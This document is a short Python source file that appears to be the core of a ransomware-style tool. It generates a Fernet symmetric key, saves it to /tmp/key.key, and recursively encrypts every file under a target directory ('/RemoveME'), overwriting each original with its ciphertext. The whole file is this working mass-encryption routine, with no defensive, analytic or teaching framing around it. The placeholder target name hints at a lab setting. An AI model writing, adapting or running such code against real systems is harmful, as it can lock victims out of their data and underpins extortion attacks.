import os
from cryptography.fernet import Fernet
import glob


def create_symmetric_key() -> (bytes, str):
    """
    Generate AES key

    :return: Symmetric key
    """

    os.chdir('/tmp')

    symmetric_key = Fernet.generate_key()
    with open('key.key', 'wb') as keyfile:
        keyfile.write(symmetric_key)

    key_path = '/tmp/key.key'

    return symmetric_key, key_path


def encrypt_target_files(symmetric_key) -> None:
    """
    Find target files & encrypt

    :return: None
    """

    for file_path in glob.glob('/RemoveME/**', recursive=True):
        try:
            encrypting(file_path, symmetric_key)
            print('Encrypting ' + file_path)
        except Exception as e:
            print(e)
            continue


def encrypting(file_path, symmetric_key) -> None:
    """
    Encrypts file located at 'file_path' with symmetric_key

    :param file_path: file path to encrypt
    :param symmetric_key: symmetric key for encryption
    :return: None
    """
    with open(file_path, 'rb') as sub_file:
        content = sub_file.read()

    content_encrypted = Fernet(symmetric_key).encrypt(content)

    with open(file_path, 'wb') as sub_file:
        sub_file.write(content_encrypted)
